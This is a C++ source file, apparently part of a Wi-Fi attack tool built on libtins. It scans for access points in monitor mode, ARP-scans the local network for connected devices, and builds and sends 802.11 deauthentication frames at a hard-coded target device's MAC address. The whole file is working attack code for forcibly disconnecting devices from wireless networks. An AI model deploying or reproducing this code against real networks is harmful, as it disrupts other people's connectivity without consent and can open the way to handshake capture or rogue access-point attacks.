#include <codecvt>
#include "Network.h"

using namespace Tins;

Network::Network()
{
    ifaceName = "wlan0";
    bssid = HWAddress<6>("00:00:00:00:00:00"); //Router
    target = HWAddress<6>("40:b4:cd:6e:de:d5"); //Amazon Fire
    deauthPacket = Dot11Deauthentication(target, bssid); //Set target / sender
    deauthPacket.addr3(bssid); //Set the BSSID
    deauthPacket.reason_code(0x0007); //From airplay-ng
    radio = RadioTap() / deauthPacket;
}

Network::~Network()
{
}

void Network::sendDeauth() {
    sender.send(radio, ifaceName);
}

std::vector<std::wstring> Network::getInterfaces() {
    std::vector<std::wstring> interfacesNames;
    // First fetch all network interfaces
    std::vector<NetworkInterface> interfaces = NetworkInterface::all();
    // Now iterate them
    for (const NetworkInterface& iface : interfaces) {
        interfacesNames.push_back(iface.friendly_name());
    }

    return interfacesNames;
}

std::vector<std::string> Network::getConnectedDevices() {
    std::vector<std::string> targets;
    NetworkInterface iface = NetworkInterface(ifaceName);
    NetworkInterface::Info infoScanner = iface.info();
    // Do ARP Scanning to all IP range addresses.
    for (const auto &target : networkRange) {
        EthernetII scan = ARP::make_arp_request(target, infoScanner.ip_addr, infoScanner.hw_addr);
        std::unique_ptr<PDU> reply(sender.send_recv(scan, iface));
        if (reply) {
            targets.push_back((reply->rfind_pdu<ARP>()).sender_hw_addr().to_string());
            std::cout << "Target found : [" << target << " / " << targets.back() << " ]" << std::endl;
        }
    }

    return targets;
}

std::map<std::string, Dot11::address_type> Network::getAccessPoints() {

    SnifferConfiguration config;
    config.set_promisc_mode(true);
    config.set_filter("type mgt subtype beacon");
    config.set_rfmon(true);

    Sniffer sniffer(ifaceName, config);
    sniffer.set_timeout(1000);
    sniffer.sniff_loop(make_sniffer_handler(this, &Network::scanCallback));
    sniffer.stop_sniff();

    return accessPoints;
}

bool Network::scanCallback(PDU &pdu) {
    // Get the Dot11 layer
    const Dot11Beacon& beacon = pdu.rfind_pdu<Dot11Beacon>();
    // All beacons must have from_ds == to_ds == 0
    if (!beacon.from_ds() && !beacon.to_ds()) {
        // Get the AP address
        address_type addr = beacon.addr2();
        // Look it up in our set
        ssids_type::iterator it = ssids.find(addr);
        if (it == ssids.end()) {
            // First time we encounter this BSSID.
            try {
                /* If no ssid option is set, then Dot11::ssid will throw
                 * a std::runtime_error.
                 */
                std::string ssid = beacon.ssid();
                // Save it so we don't show it again.
                ssids.insert(addr);
                // Display the tuple "address - ssid".
                if(!ssid.empty()) {
                    std::cout << accessPoints.size() + 1 << " -> " << addr << " - " << ssid << std::endl;
                    accessPoints.insert(std::pair<std::string, address_type>(ssid, addr));
                }
            } catch (std::runtime_error&) {
                // No ssid, just ignore it.
            }
        }
    }

    return true;
}

void Network::setInterface(std::string interface) {
    ifaceName = interface;
}

void Network::setBssid(const std::string hwAddress) {
    bssid = HWAddress<6>(hwAddress);
}

std::string Network::getBssid() {
    return bssid.to_string();
}